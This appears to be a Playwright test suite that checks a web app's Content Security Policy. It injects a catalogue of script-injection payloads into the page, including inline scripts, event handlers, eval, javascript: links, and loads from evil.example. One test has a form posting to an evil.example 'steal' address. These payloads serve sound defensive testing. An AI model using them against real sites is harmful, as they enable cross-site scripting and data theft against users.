import { expect, test } from '@playwright/test';

import { arm, openSafeFlow, readReport, SETTLE_MS } from './support/armed.ts';

// Plan section 4: a Content Security Policy with no external scripts. Each attack here is written
// straight into the page, the way a hole in the sanitiser would let it in. The first half proves
// each one works when the policy is off, so the second half means something.

interface Attack {
  name: string;
  /** Page code that tries it. */
  run: string;
  /** Whether it calls `__pwned` when nothing stops it. */
  fires: boolean;
  /** The address it would ask for, on another site. */
  asks?: string;
  /** The directive Chromium names when it blocks this. */
  directive: string;
}

const add = (tag: string, props: Record<string, string>): string =>
  `document.body.append(Object.assign(document.createElement('${tag}'), ${JSON.stringify(props)}));`;

const ATTACKS: Attack[] = [
  {
    name: 'an inline script',
    run: add('script', { textContent: `__pwned('inline')` }),
    fires: true,
    directive: 'script-src',
  },
  {
    name: 'a script from another site',
    run: add('script', { src: 'https://evil.example/x.js' }),
    fires: false,
    asks: 'https://evil.example/x.js',
    directive: 'script-src',
  },
  {
    name: 'a script in a data address',
    run: add('script', { src: `data:text/javascript,__pwned('data')` }),
    fires: true,
    directive: 'script-src',
  },
  {
    name: 'a script in a blob address',
    run: `const url = URL.createObjectURL(new Blob(["__pwned('blob')"], { type: 'text/javascript' }));
      document.body.append(Object.assign(document.createElement('script'), { src: url }));`,
    fires: true,
    directive: 'script-src',
  },
  {
    name: 'an event handler in markup',
    run: `const box = document.createElement('div');
      box.innerHTML = '<img src="data:," onerror="__pwned(1)" onload="__pwned(2)">';
      document.body.append(box);`,
    fires: true,
    directive: 'script-src',
  },
  {
    name: 'an event handler in an attribute',
    run: `const el = document.createElement('div');
      el.setAttribute('onclick', "__pwned('attr')");
      document.body.append(el);
      el.click();`,
    fires: true,
    directive: 'script-src',
  },
  {
    name: 'eval',
    run: `try { eval("__pwned('eval')"); } catch { /* blocked */ }`,
    fires: true,
    directive: 'script-src',
  },
  {
    name: 'the Function constructor',
    run: `try { new Function("__pwned('function')")(); } catch { /* blocked */ }`,
    fires: true,
    directive: 'script-src',
  },
  {
    name: 'a timer with text',
    run: `setTimeout("__pwned('timer')", 0);`,
    fires: true,
    directive: 'script-src',
  },
  {
    name: 'a link with a script address',
    run: `const a = document.createElement('a');
      a.href = "javascript:__pwned('link')";
      document.body.append(a);
      a.click();`,
    fires: true,
    directive: 'script-src',
  },
  {
    name: 'a module from another site',
    run: `import('https://evil.example/m.js').catch(() => {});`,
    fires: false,
    asks: 'https://evil.example/m.js',
    directive: 'script-src',
  },
  {
    name: 'a worker in a data address',
    run: `try {
        new Worker('data:text/javascript,postMessage(1)').onmessage = () => __pwned('worker');
      } catch { /* blocked */ }`,
    fires: true,
    directive: 'worker-src',
  },
  {
    name: 'a frame with a script',
    run: `const f = document.createElement('iframe');
      f.srcdoc = "<script>top.__pwned('frame')</scr" + "ipt>";
      document.body.append(f);`,
    fires: true,
    directive: 'script-src',
  },
  {
    name: 'a frame from another site',
    run: add('iframe', { src: 'https://evil.example/frame.html' }),
    fires: false,
    asks: 'https://evil.example/frame.html',
    directive: 'frame-src',
  },
  {
    name: 'an object from another site',
    run: add('object', { data: 'https://evil.example/o.html' }),
    fires: false,
    asks: 'https://evil.example/o.html',
    directive: 'object-src',
  },
  {
    name: 'an embed from another site',
    run: add('embed', { src: 'https://evil.example/e.html' }),
    fires: false,
    asks: 'https://evil.example/e.html',
    directive: 'object-src',
  },
  {
    name: 'an image from another site',
    run: add('img', { src: 'https://evil.example/i.png' }),
    fires: false,
    asks: 'https://evil.example/i.png',
    directive: 'img-src',
  },
  {
    name: 'a stylesheet from another site',
    run: `const l = document.createElement('link');
      l.rel = 'stylesheet';
      l.href = 'https://evil.example/s.css';
      document.head.append(l);`,
    fires: false,
    asks: 'https://evil.example/s.css',
    directive: 'style-src',
  },
  {
    name: 'a font from another site',
    run: `const s = document.createElement('style');
      s.textContent = "@font-face { font-family: evil; src: url(https://evil.example/f.woff2) } body { font-family: evil }";
      document.head.append(s);
      document.fonts.load('16px evil').catch(() => {});`,
    fires: false,
    asks: 'https://evil.example/f.woff2',
    directive: 'font-src',
  },
  {
    name: 'a plain web request to another site',
    run: `fetch('http://evil.example/f').catch(() => {});`,
    fires: false,
    asks: 'http://evil.example/f',
    directive: 'connect-src',
  },
  {
    name: 'a web socket to another site',
    run: `try { new WebSocket('wss://evil.example/w'); } catch { /* blocked */ }`,
    fires: false,
    directive: 'connect-src',
  },
];

// A later task, because Chromium lets eval run in the code a test tool sends directly.
const inLaterTask = (code: string): string => `setTimeout(() => { ${code} }, 0); undefined`;

for (const attack of ATTACKS) {
  test.describe(attack.name, () => {
    if (attack.fires || attack.asks) {
      test.describe('with the policy off', () => {
        test.use({ bypassCSP: true });

        test('does what it was written to do', async ({ page, baseURL }) => {
          const armed = await arm(page, baseURL);
          await openSafeFlow(page);
          await page.evaluate(inLaterTask(attack.run));
          if (attack.fires) {
            await expect.poll(async () => (await readReport(page)).fired.length).toBeGreaterThan(0);
          }
          if (attack.asks) await expect.poll(() => armed.outside).toContain(attack.asks);
        });
      });
    }

    test('with the policy on, is stopped', async ({ page, baseURL, browserName }, testInfo) => {
      const armed = await arm(page, baseURL);
      await openSafeFlow(page);
      await page.evaluate(inLaterTask(attack.run));
      await page.waitForTimeout(SETTLE_MS);
      const report = await readReport(page);
      expect(report.fired).toEqual([]);
      expect(armed.outside).toEqual([]);
      // The report's wording differs between browsers, and the phone project is Chromium too.
      if (browserName === 'chromium' && testInfo.project.name === 'chromium') {
        expect(report.csp.map((c) => c.directive).join()).toContain(attack.directive);
      }
    });
  });
}

test('with the policy on, a base element cannot move the page', async ({ page, baseURL }) => {
  const armed = await arm(page, baseURL);
  await openSafeFlow(page);
  const before = await page.evaluate<string>('document.baseURI');
  await page.evaluate(add('base', { href: 'https://evil.example/' }).replace('body', 'head'));
  expect(await page.evaluate<string>('document.baseURI')).toBe(before);
  expect(armed.outside).toEqual([]);
});

test('with the policy on, a form cannot send to another site', async ({ page, baseURL }) => {
  const armed = await arm(page, baseURL);
  await openSafeFlow(page);
  const before = page.url();
  await page.evaluate(
    `const form = document.createElement('form');
    form.action = 'https://evil.example/steal';
    form.method = 'post';
    document.body.append(form);
    form.submit();`,
  );
  await page.waitForTimeout(SETTLE_MS);
  expect(page.url()).toBe(before);
  expect(armed.outside).toEqual([]);
});

test.describe('the built page', () => {
  const POLICY: Record<string, string[]> = {
    'default-src': ["'self'"],
    'script-src': ["'self'"],
    'style-src': ["'self'", "'unsafe-inline'"],
    'img-src': ["'self'", 'data:', 'blob:'],
    'font-src': ["'self'", 'data:'],
    'connect-src': ["'self'", 'https:', 'http://localhost:*', 'http://127.0.0.1:*'],
    'object-src': ["'none'"],
    'base-uri': ["'none'"],
    'form-action': ["'none'"],
  };

  test('has the policy first in its head, and loads scripts only from itself', async ({
    request,
  }) => {
    const html = await (await request.get('/')).text();
    const head = html.slice(html.indexOf('<head>'), html.indexOf('</head>'));
    const meta = /<meta\s+http-equiv="Content-Security-Policy"\s+content="([^"]+)"/.exec(head);
    expect(meta?.[1]).toBeTruthy();
    // The build writes the attribute with HTML entities; the browser reads it decoded.
    const content = (meta?.[1] ?? '')
      .replace(/&#39;/g, "'")
      .replace(/&quot;/g, '"')
      .replace(/&amp;/g, '&');
    const directives = Object.fromEntries(
      content
        .split(';')
        .map((part) => part.trim().split(/\s+/))
        .filter((parts) => parts[0])
        .map(([name, ...sources]) => [name, sources]),
    );
    expect(directives).toEqual(POLICY);

    // Nothing that loads or runs comes before the policy.
    const first = head.search(/<(?:script|link|style|base)\b/);
    expect(first === -1 || (meta?.index ?? 0) < first).toBe(true);

    const addresses = [...html.matchAll(/<(?:script|link)\b[^>]*\b(?:src|href)="([^"]+)"/g)].map(
      (m) => m[1] ?? '',
    );
    expect(addresses.length).toBeGreaterThan(0);
    for (const address of addresses) expect(address).not.toMatch(/^(?:[a-z]+:)?\/\//i);
    expect(html).not.toMatch(/<script(?![^>]*\bsrc=)[^>]*>/);
  });

  test('runs with no complaint from the policy', async ({ page, baseURL }) => {
    const armed = await arm(page, baseURL);
    await openSafeFlow(page);
    await page.waitForTimeout(SETTLE_MS);
    const report = await readReport(page);
    expect(report.csp).toEqual([]);
    expect(armed.outside).toEqual([]);
  });
});
